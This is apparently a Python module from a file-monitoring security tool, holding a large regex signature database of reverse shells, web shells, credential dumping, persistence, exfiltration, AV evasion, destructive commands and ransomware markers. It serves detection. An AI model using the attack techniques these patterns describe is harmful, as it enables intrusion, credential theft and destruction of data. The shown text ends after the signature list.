"""
llm_analyzer.py - File change analysis engine.

Two-tier approach:
  1. Ollama LLM analysis (when available) - deep contextual reasoning
  2. Heuristic engine (fallback) - pattern-based content + path analysis

The heuristic engine scans file content for known threat indicators:
  - Reverse shells, bind shells, C2 callbacks
  - Credential harvesting, keyloggers, password dumping
  - Privilege escalation, persistence mechanisms
  - Obfuscation, encoding, packed payloads
  - Data exfiltration patterns
  - Suspicious system calls and commands
"""
import os
import re
import json
import requests
from typing import Dict, Any, Optional, List, Tuple

from .config import settings

# Cross-platform context (imported lazily to avoid circular imports)
def _get_llm_context(file_path: str, change_type: str) -> str:
    """Get OS context for the LLM prompt."""
    try:
        from .os_context import get_context_for_llm, format_context_for_prompt
        ctx = get_context_for_llm(file_path, change_type)
        return format_context_for_prompt(ctx)
    except Exception:
        return 'OS Context: unavailable'


# Threat Signature Database

# Each pattern: (compiled_regex, threat_category, severity, description)
# severity: 10=critical, 7-9=high, 4-6=medium, 2-3=low

THREAT_PATTERNS: List[Tuple[re.Pattern, str, int, str]] = []

def _p(pattern: str, category: str, severity: int, desc: str):
    """Helper to register a threat pattern."""
    THREAT_PATTERNS.append((
        re.compile(pattern, re.IGNORECASE | re.MULTILINE),
        category, severity, desc
    ))

# Reverse shell patterns

# Bash / Sh / Zsh
_p(r'/dev/tcp/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d+', 'reverse_shell', 10, 'Bash reverse shell via /dev/tcp')
_p(r'bash\s+-i\s+>&\s*/dev/tcp/', 'reverse_shell', 10, 'Interactive bash reverse shell')
_p(r'exec\s+\d+<>/dev/tcp/', 'reverse_shell', 10, 'Bash file descriptor reverse shell')
_p(r'0<&196;exec\s+196<>/dev/tcp/', 'reverse_shell', 10, 'Bash Fd 196 reverse shell')
_p(r'sh\s+-i\s+>\s*&\s*/dev/udp/', 'reverse_shell', 10, 'Interactive sh UDP reverse shell')
_p(r'zsh\s+-c\s+[\'"]zmodload zsh/net/tcp', 'reverse_shell', 10, 'Zsh network module reverse shell')

# Netcat / Ncat
_p(r'nc\s+(-e|--exec)\s+(/bin/(ba)?sh|cmd\.exe)', 'reverse_shell', 10, 'Netcat reverse shell with exec')
_p(r'ncat\s+.*(-e|--exec)', 'reverse_shell', 10, 'Ncat reverse shell')
_p(r'rm\s+/tmp/f;\s*mkfifo\s+/tmp/f;\s*cat\s+/tmp/f\s*\|\s*(/bin/sh|/bin/bash)\s*-i\s*2>&1\s*\|\s*nc\s+', 'reverse_shell', 10, 'Netcat reverse shell via mkfifo')
_p(r'nc\s+-c\s+(/bin/(ba)?sh)', 'reverse_shell', 10, 'Netcat BSD reverse shell')

# Python
_p(r'import\s+socket,subprocess,os;s=socket\.socket\(socket\.AF_INET,socket\.SOCK_STREAM\);s\.connect', 'reverse_shell', 10, 'Python socket dup2 reverse shell')
_p(r'python\s+-c\s+[\'"]import\s+socket,subprocess,os', 'reverse_shell', 10, 'Python one-liner reverse shell')
_p(r'python3\s+-c\s+[\'"]import\s+pty.*pty\.spawn', 'reverse_shell', 10, 'Python pty shell spawn')
_p(r'__import__\([\'"]pty[\'"]\)\.spawn\([\'"]/bin/bash[\'"]\)', 'reverse_shell', 10, 'Python __import__ pty spawn')
_p(r'socket\.connect\s*\(\s*\(.*\d+\.\d+\.\d+\.\d+', 'reverse_shell', 9, 'Python socket connect to IP')
_p(r'subprocess\.call\(\[.*(/bin/sh|cmd\.exe|powershell)', 'reverse_shell', 9, 'Subprocess spawn shell')
_p(r'os\.dup2\s*\(.*fileno', 'reverse_shell', 8, 'Python os.dup2 redirecting file descriptors')

# PowerShell
_p(r'New-Object\s+System\.Net\.Sockets\.TCPClient', 'reverse_shell', 10, 'PowerShell .NET TCP client (reverse shell)')
_p(r'TCPClient\s*\(\s*["\']?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', 'reverse_shell', 10, 'PowerShell TCP reverse shell explicitly to IP')
_p(r'IO\.StreamReader.*IO\.StreamWriter', 'reverse_shell', 9, '.NET stream reader/writer (shell pattern)')
_p(r'powershell.*-EncodedCommand\s+[A-Za-z0-9+/=]{10,}', 'reverse_shell', 10, 'PowerShell encoded command (frequent shell)')
_p(r'powershell.*-nop.*-c\s+[\'"]\$client\s*=\s*New-Object', 'reverse_shell', 10, 'PowerShell one-liner shell variable setup')
_p(r'IEX\s*\(New-Object\s+Net\.WebClient\)\.DownloadString\([\'"]http', 'downloader', 10, 'PowerShell IEX download and execute payload')

# PHP
_p(r'php\s+-r\s+[\'"]\$sock[= ]fsockopen', 'reverse_shell', 10, 'PHP reverse shell via fsockopen')
_p(r'exec\([\'"]/bin/sh\s+-i\s+<\s*&3\s*>\s*&3', 'reverse_shell', 10, 'PHP exec file descriptor shell')
_p(r'system\(\$_GET\[.*\]\)', 'web_shell', 10, 'PHP simple web shell (system($_GET))')

# Ruby / Perl
_p(r'ruby\s+-rsocket\s+-e\s+[\'"]f=TCPSocket\.open', 'reverse_shell', 10, 'Ruby reverse shell')
_p(r'perl\s+-e\s+[\'"]use\s+Socket;\s*\$i=', 'reverse_shell', 10, 'Perl reverse shell')

# Socat / AWK / Lua / Golang / Java
_p(r'socat\s+(TCP|UDP)[46]?-?(LISTEN|CONNECT).*EXEC:', 'reverse_shell', 10, 'Socat reverse or bind shell')
_p(r'awk\s+[\'"]BEGIN\s*{\s*s\s*=\s*"/inet/tcp/', 'reverse_shell', 10, 'AWK networking reverse shell')
_p(r'lua\s+-e\s+[\'"]require\([\'"]socket[\'"]\)', 'reverse_shell', 8, 'Lua socket import (potential shell)')
_p(r'echo\s+[\'"]package\s+main.*import\s+.*net.*exec.*os.*syscall.*cmd\.Run\(\)', 'reverse_shell', 10, 'Golang reverse shell payload')
_p(r'Runtime\.getRuntime\(\)\.exec\([\'"](/bin/bash|cmd\.exe)', 'reverse_shell', 9, 'Java Runtime.exec spawning shell')

# General Shell/Metasploit
_p(r'msfvenom|meterpreter|metasploit', 'reverse_shell', 10, 'Metasploit/meterpreter reference')

# C/C++ & Win32 API Reverse Shells
_p(r'WSASocket\s*\(.*SOCK_STREAM', 'reverse_shell', 10, 'Win32 WSASocket TCP connection (reverse shell indicator)')
_p(r'WSAConnect\s*\(', 'reverse_shell', 9, 'Win32 WSAConnect (shell network connection)')
_p(r'winsock2\.h', 'reverse_shell', 7, 'Winsock2 include (network socket programming)')
_p(r'ws2_32', 'reverse_shell', 7, 'ws2_32 library link (Windows socket library)')
_p(r'CreateProcess\s*\(.*cmd\.exe', 'reverse_shell', 10, 'CreateProcess spawning cmd.exe (shell execution)')
_p(r'CreateProcess\s*\(.*powershell', 'reverse_shell', 10, 'CreateProcess spawning PowerShell')
_p(r'CreateProcess\s*\(.*\bsh\b', 'reverse_shell', 9, 'CreateProcess spawning shell')
_p(r'STARTF_USESTDHANDLES.*hStdInput.*hStdOutput.*Winsock', 'reverse_shell', 10, 'Stdio redirected to socket (classic Win32 reverse shell)')
_p(r'hStdInput\s*=\s*hStd(Output|Error)\s*=.*\(HANDLE\)', 'reverse_shell', 10, 'All stdio handles redirected (reverse shell pattern)')
_p(r'STARTUPINFO.*dwFlags.*STARTF_USESTDHANDLES', 'reverse_shell', 8, 'STARTUPINFO with handle redirection')
_p(r'gethostbyname\s*\(.*\)\s*.*inet_ntoa', 'reverse_shell', 7, 'DNS resolution + IP connection (C2 callback pattern)')
_p(r'connect\s*\(\s*\w+\s*,\s*\(.*sockaddr', 'reverse_shell', 8, 'C socket connect() call')
_p(r'AF_INET\s*,\s*SOCK_STREAM\s*,\s*IPPROTO_TCP', 'reverse_shell', 8, 'TCP socket creation (C/C++)')
_p(r'sin_port\s*=\s*htons\s*\(', 'reverse_shell', 7, 'Port setting with htons (network connection)')
_p(r'inet_addr\s*\(\s*ip', 'reverse_shell', 7, 'inet_addr IP conversion')
_p(r'socket\s*\(\s*AF_INET\s*,\s*SOCK_STREAM', 'reverse_shell', 8, 'C socket() TCP creation')
_p(r'dup2\s*\(\s*\w+\s*,\s*(0|1|2|STDIN|STDOUT|STDERR)', 'reverse_shell', 10, 'dup2 redirecting stdio to socket (Unix reverse shell)')
_p(r'(execve|execl|execlp|execvp)\s*\(\s*["\'/]*(bin/sh|bin/bash|cmd)', 'reverse_shell', 10, 'exec() family spawning shell')
_p(r'ShellExecute\s*\(.*cmd|ShellExecuteEx', 'reverse_shell', 8, 'Win32 ShellExecute command')
_p(r'WinExec\s*\(', 'reverse_shell', 8, 'Win32 WinExec API call')
_p(r'system\s*\(\s*"(cmd|/bin/sh|bash|powershell|sh\b)', 'reverse_shell', 9, 'C system() spawning shell')

# Network / C2 Callbacks
_p(r'InternetOpen\s*\(|HttpOpenRequest|HttpSendRequest', 'c2_callback', 8, 'WinINet HTTP API (potential C2 callback)')
_p(r'URLDownloadToFile\s*\(', 'c2_callback', 9, 'URLDownloadToFile (download & execute pattern)')
_p(r'WinHttpOpen|WinHttpConnect|WinHttpSendRequest', 'c2_callback', 8, 'WinHTTP API calls (potential C2)')
_p(r'curl_easy_perform|libcurl', 'c2_callback', 6, 'libcurl network request')
_p(r'recv\s*\(.*send\s*\(|send\s*\(.*recv\s*\(', 'c2_callback', 7, 'Socket send/recv pattern (bidirectional comms)')
_p(r'\b(cobalt[-_.\s]?strike|command[-_.\s]?and[-_.\s]?control)\b', 'c2_callback', 8, 'C2 terminology detected')

# Process Injection (C/C++)
_p(r'VirtualAlloc(Ex)?\s*\(.*PAGE_EXECUTE', 'process_injection', 10, 'Executable memory allocation (shellcode injection)')
_p(r'WriteProcessMemory\s*\(', 'process_injection', 10, 'WriteProcessMemory (process injection)')
_p(r'CreateRemoteThread\s*\(', 'process_injection', 10, 'CreateRemoteThread (remote code injection)')
_p(r'NtCreateThreadEx|RtlCreateUserThread', 'process_injection', 10, 'Low-level thread injection')
_p(r'OpenProcess\s*\(.*PROCESS_ALL_ACCESS', 'process_injection', 9, 'OpenProcess with full access (injection prep)')
_p(r'QueueUserAPC\s*\(', 'process_injection', 9, 'APC injection technique')
_p(r'SetThreadContext|NtSetContextThread', 'process_injection', 9, 'Thread context manipulation (injection)')
_p(r'MapViewOfSection|NtMapViewOfSection', 'process_injection', 8, 'Section mapping (process hollowing)')

# Additional Reverse Shell Languages (revshells.com coverage)

# Go / Golang Reverse Shell
_p(r'net\.Dial\s*\(\s*"tcp"', 'reverse_shell', 9, 'Go TCP dial (reverse shell pattern)')
_p(r'exec\.Command\s*\(\s*"(/bin/sh|/bin/bash|cmd\.exe|cmd|sh|bash|powershell)"', 'reverse_shell', 10, 'Go exec.Command spawning shell')
_p(r'os/exec.*net\.Conn', 'reverse_shell', 9, 'Go os/exec + net.Conn (reverse shell combo)')
_p(r'cmd\.Stdin\s*=\s*conn|cmd\.Stdout\s*=\s*conn|cmd\.Stderr\s*=\s*conn', 'reverse_shell', 10, 'Go cmd I/O redirected to network connection')
_p(r'syscall\.Dup2.*net\.Dial', 'reverse_shell', 10, 'Go syscall.Dup2 with network dial (reverse shell)')

# Java Reverse Shell
_p(r'Runtime\.getRuntime\(\)\.exec\s*\(\s*.*(/bin/sh|/bin/bash|cmd\.exe|cmd)', 'reverse_shell', 10, 'Java Runtime.exec spawning shell')
_p(r'ProcessBuilder\s*\(\s*.*(/bin/sh|/bin/bash|cmd\.exe|cmd)', 'reverse_shell', 10, 'Java ProcessBuilder spawning shell')
_p(r'new\s+Socket\s*\(\s*"?\d+\.\d+', 'reverse_shell', 9, 'Java Socket connecting to IP')
_p(r'java\.net\.Socket\s*\(', 'reverse_shell', 8, 'Java Socket creation')
_p(r'Process\s+.*=\s*.*Runtime.*exec.*\n.*getInputStream.*getOutputStream', 'reverse_shell', 10, 'Java process I/O for reverse shell')
_p(r'ServerSocket\s*\(\s*\d+', 'bind_shell', 8, 'Java ServerSocket (bind shell)')

# Node.js Reverse Shell
_p(r'require\s*\(\s*["\']child_process["\']\s*\).*spawn\s*\(\s*.*(/bin/sh|sh|bash|cmd)', 'reverse_shell', 10, 'Node.js child_process.spawn shell')
_p(r'require\s*\(\s*["\']net["\']\s*\).*\.connect\s*\(\s*\d+', 'reverse_shell', 9, 'Node.js net.connect (reverse shell)')
_p(r'child_process.*exec\s*\(|child_process.*execSync', 'reverse_shell', 8, 'Node.js child_process exec')
_p(r'net\.Socket\(\).*\.connect\(\{.*port', 'reverse_shell', 9, 'Node.js Socket connect with port')
_p(r'require\s*\(\s*["\']net["\']\s*\).*\.createServer', 'bind_shell', 8, 'Node.js net.createServer (bind shell)')
_p(r'(spawn|exec)\s*\(\s*["\']/bin/(ba)?sh["\'].*stdio.*pipe', 'reverse_shell', 10, 'Node.js spawn shell with pipe I/O')

# Lua Reverse Shell
_p(r'socket\.tcp\s*\(\s*\)', 'reverse_shell', 8, 'Lua TCP socket creation')
_p(r'socket\.connect\s*\(\s*["\']?\d+\.\d+', 'reverse_shell', 9, 'Lua socket connect to IP')
_p(r'os\.execute\s*\(\s*.*(/bin/sh|bash|cmd|sh)', 'reverse_shell', 9, 'Lua os.execute spawning shell')
_p(r'io\.popen\s*\(\s*.*(/bin/sh|bash|cmd)', 'reverse_shell', 9, 'Lua io.popen spawning shell')
_p(r'require\s*\(\s*["\']socket["\']\s*\).*tcp\s*\(\s*\)', 'reverse_shell', 9, 'Lua require socket + TCP')

# Groovy Reverse Shell
_p(r'\.execute\s*\(\s*\)\.text.*(/bin/sh|bash|cmd)', 'reverse_shell', 9, 'Groovy execute shell')
_p(r'groovy\.lang.*ProcessBuilder|".*".execute\(\)', 'reverse_shell', 8, 'Groovy command execution')
_p(r'new\s+Socket\s*\(.*\).*getInputStream.*Process', 'reverse_shell', 10, 'Groovy Socket + Process (reverse shell)')
_p(r'Thread\.start\s*\{.*socket.*process', 'reverse_shell', 9, 'Groovy threaded socket reverse shell')

# Dart Reverse Shell
_p(r'Socket\.connect\s*\(\s*["\']?\d+\.\d+', 'reverse_shell', 9, 'Dart Socket.connect to IP')
_p(r'Process\.start\s*\(\s*.*(/bin/sh|bash|cmd|powershell)', 'reverse_shell', 10, 'Dart Process.start spawning shell')
_p(r'dart:io.*Socket\.connect', 'reverse_shell', 9, 'Dart IO Socket connect')

# Awk Reverse Shell
_p(r'awk\s+.*BEGIN.*inet.*stream', 'reverse_shell', 10, 'Awk inet reverse shell')
_p(r'awk.*\/inet\/tcp\/\d+\/', 'reverse_shell', 10, 'Awk /inet/tcp/ reverse shell')
_p(r'gawk\s+.*\/inet\/', 'reverse_shell', 10, 'Gawk inet reverse shell')

# OpenSSL Reverse Shell
_p(r'openssl\s+s_client\s+-connect\s+\d+\.\d+', 'reverse_shell', 10, 'OpenSSL reverse shell (s_client)')
_p(r'openssl\s+s_client.*-quiet', 'reverse_shell', 9, 'OpenSSL quiet s_client connection')
_p(r'mkfifo.*openssl\s+s_client', 'reverse_shell', 10, 'Named pipe + OpenSSL reverse shell')

# Telnet Reverse Shell
_p(r'telnet\s+\d+\.\d+.*\|\s*/bin/(ba)?sh', 'reverse_shell', 10, 'Telnet reverse shell piped to shell')
_p(r'mkfifo.*telnet\s+\d+\.\d+', 'reverse_shell', 10, 'Named pipe + Telnet reverse shell')
_p(r'telnet\s+\d+\.\d+\.\d+\.\d+\s+\d+\s*\|', 'reverse_shell', 9, 'Telnet piped shell')

# Xterm Reverse Shell
_p(r'xterm\s+-display\s+\d+\.\d+', 'reverse_shell', 10, 'Xterm reverse shell (X11 forwarding)')
_p(r'DISPLAY=\d+\.\d+.*xterm', 'reverse_shell', 10, 'Xterm DISPLAY reverse shell')

# HoaxShell (PowerShell)
_p(r'hoaxshell|hoax.shell', 'reverse_shell', 10, 'HoaxShell reference detected')
_p(r'Invoke-Expression.*DownloadString.*http', 'reverse_shell', 10, 'PowerShell download + execute cradle')
_p(r'IEX\s*\(\s*\(New-Object\s+Net\.WebClient\)\.DownloadString', 'reverse_shell', 10, 'PowerShell IEX DownloadString cradle')
_p(r'Invoke-(Expression|Command).*\$\(.*Invoke-WebRequest', 'reverse_shell', 10, 'PowerShell chained web request execution')
_p(r'ConvertTo-SecureString.*AES|SecureString.*Key', 'obfuscation', 8, 'PowerShell encrypted payload')
_p(r'\$client\s*=\s*New-Object.*TCPClient.*while.*\$true', 'reverse_shell', 10, 'PowerShell TCP client loop (persistent shell)')

# Additional Bash/Unix Variations
_p(r'bash\s+-c\s+.*socket|bash\s+-c\s+.*tcp', 'reverse_shell', 9, 'Bash -c with socket/tcp')
_p(r'0<&\d+;exec\s+\d+<>/dev/tcp', 'reverse_shell', 10, 'Bash fd-based reverse shell variant')
_p(r'rm\s+/tmp/f;mkfifo\s+/tmp/f', 'reverse_shell', 10, 'Named pipe reverse shell setup')
_p(r'busybox\s+nc\s+.*-e', 'reverse_shell', 10, 'BusyBox netcat reverse shell')
_p(r'zsh\s+-c\s+.*zmodload.*net/tcp', 'reverse_shell', 10, 'Zsh TCP module reverse shell')

# Additional Python Variations
_p(r'pty\.spawn\s*\(\s*.*(/bin/sh|bash|sh)', 'reverse_shell', 10, 'Python pty.spawn interactive shell')
_p(r'import\s+pty.*import\s+socket', 'reverse_shell', 9, 'Python pty + socket (interactive reverse shell)')
_p(r'os\.popen\s*\(\s*.*nc\s', 'reverse_shell', 9, 'Python os.popen with netcat')
_p(r'subprocess.*PIPE.*socket', 'reverse_shell', 9, 'Python subprocess PIPE with socket')

# Additional PHP Variations
_p(r'pfsockopen\s*\(', 'reverse_shell', 9, 'PHP persistent socket (pfsockopen)')
_p(r'proc_open\s*\(.*cmd|proc_open\s*\(.*sh', 'reverse_shell', 10, 'PHP proc_open shell')
_p(r'pcntl_exec\s*\(\s*.*(/bin/sh|/bin/bash)', 'reverse_shell', 10, 'PHP pcntl_exec shell')
_p(r'stream_socket_client\s*\(\s*["\']tcp://', 'reverse_shell', 9, 'PHP stream_socket_client TCP')

# Additional Ruby Variations
_p(r'TCPSocket\.(new|open)\s*\(\s*["\']?\d+\.\d+', 'reverse_shell', 10, 'Ruby TCPSocket connect to IP')
_p(r'IO\.popen\s*\(\s*.*(/bin/sh|bash|cmd)', 'reverse_shell', 9, 'Ruby IO.popen shell')
_p(r'Open3\.popen3\s*\(\s*.*(/bin/sh|bash)', 'reverse_shell', 9, 'Ruby Open3 shell')

# Additional Perl Variations
_p(r'IO::Socket::INET.*PeerAddr', 'reverse_shell', 9, 'Perl IO::Socket::INET connect')
_p(r'open\s*\(\s*STDIN.*\|\|.*exec', 'reverse_shell', 10, 'Perl STDIN redirect + exec')
_p(r'perl.*-MIO.*Socket.*INET', 'reverse_shell', 10, 'Perl one-liner socket reverse shell')

# Bind Shells

_p(r'nc\s+-l(v)?p?\s+\d+.*-e', 'bind_shell', 10, 'Netcat bind shell listening')
_p(r'ncat\s+(-l|--listen).*(-e|--exec)', 'bind_shell', 10, 'Ncat bind shell')
_p(r'socat\s+TCP-LISTEN:\d+.*EXEC', 'bind_shell', 10, 'Socat bind shell')
_p(r'socket\.bind\s*\(\s*\(.*0\.0\.0\.0', 'bind_shell', 8, 'Socket bind on all interfaces')
_p(r'socket\.listen\s*\(\s*\).*exec|socket\.accept.*exec', 'bind_shell', 9, 'Socket listen + exec (bind shell)')
_p(r'ServerSocket\s*\(\s*\d+\s*\).*accept', 'bind_shell', 8, 'Java ServerSocket bind shell')

# Web Shells (expanded)

_p(r'eval\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)', 'webshell', 10, 'PHP web shell (eval user input)')
_p(r'(system|exec|passthru|shell_exec)\s*\(\s*\$_(GET|POST|REQUEST)', 'webshell', 10, 'PHP command injection via user input')
_p(r'assert\s*\(\s*\$_(GET|POST|REQUEST)', 'webshell', 10, 'PHP assert-based web shell')
_p(r'<%.*Runtime\.getRuntime\(\)\.exec', 'webshell', 10, 'JSP web shell')
_p(r'c99shell|r57shell|b374k|weevely', 'webshell', 10, 'Known web shell signature')
_p(r'eval\s*\(\s*gzinflate\s*\(\s*base64_decode', 'webshell', 10, 'PHP obfuscated web shell (gzinflate+base64)')
_p(r'preg_replace\s*\(.*e["\'\s]*,', 'webshell', 9, 'PHP preg_replace /e code execution')
_p(r'create_function\s*\(.*\$_(GET|POST|REQUEST)', 'webshell', 10, 'PHP create_function web shell')
_p(r'call_user_func\s*\(.*\$_(GET|POST|REQUEST)', 'webshell', 10, 'PHP call_user_func web shell')
_p(r'wso\s*shell|FilesMan|WSO\s*\d', 'webshell', 10, 'WSO web shell signature')
_p(r'uname\s*-a.*phpinfo|phpinfo.*uname', 'webshell', 8, 'Web shell recon pattern')

# Credential Theft / Harvesting

_p(r'mimikatz|sekurlsa|kerberos.*ticket', 'credential_theft', 10, 'Mimikatz/credential dumping tool reference')
_p(r'hashdump|pwdump|samdump|fgdump', 'credential_theft', 10, 'Password hash dumping tool')
_p(r'/etc/shadow', 'credential_theft', 9, 'Access to /etc/shadow (password hashes)')
_p(r'SAM\s+(database|hive|file|registry)', 'credential_theft', 9, 'Windows SAM database access')
_p(r'lsass(\.exe|\.dmp|\s+dump|\s+memory)', 'credential_theft', 10, 'LSASS memory dump (credential theft)')
_p(r'Net-NTLMv[12]|ntlm.*hash|pass.*the.*hash', 'credential_theft', 9, 'NTLM hash / pass-the-hash attack')
_p(r'keylog(ger|ging|_)', 'credential_theft', 9, 'Keylogger indicator')
_p(r'GetAsyncKeyState|SetWindowsHookEx.*WH_KEYBOARD', 'credential_theft', 9, 'Windows keylogger API calls')
_p(r'LaZagne|credentialdumper|credential.?dump', 'credential_theft', 10, 'Credential dumping tool')
_p(r'procdump.*-ma\s+lsass|procdump.*lsass', 'credential_theft', 10, 'ProcDump targeting LSASS')
_p(r'reg\s+save.*SAM|reg\s+save.*SYSTEM', 'credential_theft', 10, 'Registry hive extraction for credential theft')
_p(r'Invoke-Kerberoast|rubeus|asreproast', 'credential_theft', 10, 'Kerberos attack tool')

# Privilege Escalation

_p(r'sudo\s+(chmod\s+[47]|chown\s+root|bash|su\s)', 'priv_escalation', 8, 'Sudo privilege escalation attempt')
_p(r'chmod\s+[ugo]*\+?s\s', 'priv_escalation', 9, 'SUID/SGID bit manipulation')
_p(r'chmod\s+(4755|4777|6755|2755)\s', 'priv_escalation', 9, 'Setting SUID/SGID permissions')
_p(r'setuid|setgid|seteuid', 'priv_escalation', 8, 'setuid/setgid system calls')
_p(r'runas\s+/user:\s*administrator', 'priv_escalation', 8, 'Windows RunAs administrator')
_p(r'Invoke-TokenManipulation|Get-System', 'priv_escalation', 9, 'PowerShell token manipulation')
_p(r'\b(exploit|shellcode)\b', 'priv_escalation', 5, 'Exploit/shellcode terminology')
_p(r'0x(?:90){3,}', 'priv_escalation', 9, 'NOP sled / shellcode byte pattern')
_p(r'JuicyPotato|RottenPotato|PrintSpoofer|GodPotato', 'priv_escalation', 10, 'Windows privilege escalation tool')
_p(r'Invoke-PowerShellTcp|Invoke-Shellcode', 'priv_escalation', 10, 'PowerSploit exploit module')
_p(r'find\s+/\s+-perm.*-type\s+f.*suid', 'priv_escalation', 7, 'SUID binary enumeration')
_p(r'getcap\s|setcap\s|cap_setuid', 'priv_escalation', 8, 'Linux capabilities manipulation')

# Persistence Mechanisms

_p(r'crontab\s+(-e|-l|.*\*/)', 'persistence', 8, 'Crontab modification (persistence)')
_p(r'/etc/cron\.d|/etc/crontab', 'persistence', 8, 'System cron modification')
_p(r'(HKLM|HKCU).*\\Run\\', 'persistence', 9, 'Windows registry Run key (auto-start)')
_p(r'schtasks\s+/create', 'persistence', 8, 'Windows scheduled task creation')
_p(r'Register-ScheduledTask', 'persistence', 8, 'PowerShell scheduled task creation')
_p(r'sc\s+(create|config)\s', 'persistence', 8, 'Windows service creation/modification')
_p(r'New-Service|Set-Service', 'persistence', 8, 'PowerShell service manipulation')
_p(r'systemctl\s+(enable|daemon-reload)', 'persistence', 7, 'Systemd service enabling')
_p(r'\.bashrc|\.bash_profile|\.profile|\.zshrc', 'persistence', 6, 'Shell profile modification (possible persistence)')
_p(r'LaunchAgent|LaunchDaemon|com\.apple', 'persistence', 8, 'macOS LaunchAgent/LaunchDaemon (persistence)')
_p(r'startup\s+folder|shell:startup', 'persistence', 8, 'Windows startup folder reference')
_p(r'WMI.*EventSubscription|__EventFilter', 'persistence', 9, 'WMI event subscription persistence')
_p(r'New-ItemProperty.*CurrentVersion\\Run', 'persistence', 9, 'PowerShell registry Run key persistence')

# Data Exfiltration

_p(r'curl\s+.*-d\s+@|curl\s+.*--data-binary\s+@', 'exfiltration', 8, 'File upload via curl')
_p(r'wget\s+.*--post-file', 'exfiltration', 8, 'File upload via wget')
_p(r'Invoke-WebRequest\s+.*-Method\s+Post.*-InFile', 'exfiltration', 8, 'PowerShell file exfiltration')
_p(r'tar\s+.*\|\s*(nc|ncat|curl|base64)', 'exfiltration', 9, 'Archive piped to network tool')
_p(r'(zip|tar|7z|rar)\s+.*(/etc/|C:\\Windows\\|/home/|C:\\Users\\)', 'exfiltration', 7, 'Archiving sensitive directories')
_p(r'certutil\s+-encode|certutil.*-urlcache', 'exfiltration', 9, 'Certutil for encoding/download (LOLBin)')
_p(r'bitsadmin\s+/transfer', 'exfiltration', 8, 'BitsAdmin file transfer (LOLBin)')

# Obfuscation / Encoding

_p(r'-enc(oded)?c(ommand)?\s+[A-Za-z0-9+/=]{20,}', 'obfuscation', 9, 'PowerShell encoded command')
_p(r'base64\s+(-d|--decode)', 'obfuscation', 7, 'Base64 decode operation')
_p(r'eval\s*\(\s*(atob|Buffer\.from|base64)', 'obfuscation', 8, 'Eval of base64-decoded content')
_p(r'\\x[0-9a-fA-F]{2}(\\x[0-9a-fA-F]{2}){10,}', 'obfuscation', 8, 'Hex-encoded payload')
_p(r'fromCharCode\s*\(.*\d{2,3}(\s*,\s*\d{2,3}){5,}', 'obfuscation', 7, 'JavaScript char code obfuscation')
_p(r'chr\s*\(\s*\d+\s*\)\s*(\.\s*chr\s*\(\s*\d+\s*\)){3,}', 'obfuscation', 7, 'PHP/Python chr() obfuscation')
_p(r'exec\s*\(\s*compile\s*\(.*base64', 'obfuscation', 8, 'Python exec(compile(base64...))')
_p(r'IEX\s*\(\s*\(New-Object', 'obfuscation', 9, 'PowerShell IEX download cradle')
_p(r'Invoke-Obfuscation|Out-EncodedCommand', 'obfuscation', 9, 'PowerShell obfuscation tool')
_p(r'Set-MpPreference\s+-DisableRealtimeMonitoring', 'evasion', 10, 'Windows Defender disabled')
_p(r'Stop-Service\s+.*WinDefend|sc\s+stop\s+WinDefend', 'evasion', 10, 'Windows Defender service stopped')
_p(r'Add-MpPreference\s+-ExclusionPath', 'evasion', 9, 'Windows Defender exclusion added')
_p(r'AMSI.*bypass|AmsiUtils|amsiInitFailed', 'evasion', 10, 'AMSI bypass technique')
_p(r'Unregister-EventLog|Clear-EventLog|wevtutil\s+cl', 'evasion', 9, 'Event log clearing (evidence destruction)')

# Suspicious System Calls

_p(r'os\.system\s*\(|subprocess\.Popen\s*\(.*shell\s*=\s*True', 'suspicious_exec', 7, 'Python shell command execution')
_p(r'Runtime\.getRuntime\(\)\.exec', 'suspicious_exec', 7, 'Java Runtime exec')
_p(r'ProcessBuilder|ProcessStartInfo', 'suspicious_exec', 6, 'Process creation API')
_p(r'WScript\.Shell|Shell\.Application', 'suspicious_exec', 7, 'Windows Script Host shell access')

# Network Reconnaissance

_p(r'nmap\s|masscan\s|zmap\s', 'recon', 7, 'Network scanning tool')
_p(r'net\s+(user|localgroup|group)\s', 'recon', 6, 'Windows user/group enumeration')
_p(r'whoami\s*/priv|systeminfo|ipconfig\s*/all', 'recon', 5, 'System reconnaissance commands')
_p(r'cat\s+/etc/passwd', 'recon', 6, 'Reading system user list')
_p(r'enum4linux|smbclient|rpcclient', 'recon', 7, 'SMB/RPC enumeration tools')
_p(r'gobuster|dirbuster|ffuf|wfuzz', 'recon', 7, 'Web directory enumeration tool')
_p(r'BloodHound|SharpHound|PowerView', 'recon', 9, 'Active Directory enumeration tool')
_p(r'Invoke-Portscan|Test-NetConnection.*-Port', 'recon', 7, 'PowerShell port scanning')

# Destructive Actions

_p(r'rm\s+-rf\s+/(?!tmp)', 'destructive', 9, 'Recursive delete from root')
_p(r'dd\s+if=/dev/(zero|random).*of=/dev/', 'destructive', 10, 'Disk overwrite with dd')
_p(r'format\s+[cC]:', 'destructive', 10, 'Drive format command')
_p(r':(){ :\|:& };:', 'destructive', 10, 'Fork bomb')
_p(r'del\s+/[fFsS]\s+.*\*\.\*', 'destructive', 8, 'Windows force delete wildcard')
_p(r'cipher\s+/w:', 'destructive', 8, 'Cipher wipe command (Windows)')

# Ransomware Indicators

_p(r'from\s+Crypto(dome)?\.Cipher\s+import\s+AES', 'ransomware', 9, 'Python AES encryption import (potential ransomware)')
_p(r'RSA\.generate|AES\.new.*MODE_CBC|Fernet\.generate_key', 'ransomware', 8, 'Cryptographic key generation (potential ransomware)')
_p(r'\.encrypt\s*\(.*\.read\s*\(\s*\)\s*\)', 'ransomware', 9, 'File content encryption pattern')
_p(r'ransom(ware|note|_note|\.txt|payment)', 'ransomware', 10, 'Ransomware terminology detected')
_p(r'bitcoin.*wallet|BTC.*address|monero.*payment', 'ransomware', 10, 'Cryptocurrency payment reference (ransomware)')
_p(r'YOUR\s+FILES\s+(HAVE\s+BEEN|ARE)\s+ENCRYPTED', 'ransomware', 10, 'Ransomware note text')
_p(r'os\.walk.*\.encrypt|glob\.\*\*.*\.encrypt', 'ransomware', 10, 'Mass file encryption pattern')
_p(r'CryptEncrypt|CryptGenKey|CryptAcquireContext', 'ransomware', 9, 'Win32 CryptoAPI (potential ransomware)')
_p(r'vssadmin\s+delete\s+shadows|wmic\s+shadowcopy\s+delete', 'ransomware', 10, 'Shadow copy deletion (ransomware indicator)')
